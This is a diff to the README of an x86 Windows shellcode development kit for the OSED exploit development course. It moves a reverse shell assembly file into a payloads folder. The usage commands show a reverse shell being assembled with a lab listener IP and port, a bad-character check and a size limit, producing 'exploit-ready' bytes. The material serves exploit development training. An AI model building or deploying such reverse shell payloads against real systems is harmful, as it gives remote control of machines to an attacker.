@@ -6,7 +6,7 @@ x86 Windows shellcode development environment for OSED (EXP-301).
 
 ## Contents
 
-- `revshell.asm` — position-independent reverse shell shellcode for x86 Windows
+- `payloads/revshell.asm` — position-independent reverse shell shellcode for x86 Windows
 - `assembler.py` — Keystone-based assembler with bad char checking and runtime substitution
 
 ## Requirements
@@ -19,13 +19,13 @@ pip install -r requirements.txt
 
 ```bash
 # Assemble with LHOST/LPORT
-python3 assembler.py revshell.asm -i 192.168.45.227 -p 443
+python3 assembler.py payloads/revshell.asm -i 192.168.45.227 -p 443
 
 # Bad character check
-python3 assembler.py revshell.asm -i 192.168.45.227 -p 443 -b "\x00\x0a\x0d"
+python3 assembler.py payloads/revshell.asm -i 192.168.45.227 -p 443 -b "\x00\x0a\x0d"
 
 # Size limit check
-python3 assembler.py revshell.asm -i 192.168.45.227 -p 443 -m 400
+python3 assembler.py payloads/revshell.asm -i 192.168.45.227 -p 443 -m 400
 ```
 
 Output is exploit-ready Python bytes, 16 bytes per line.
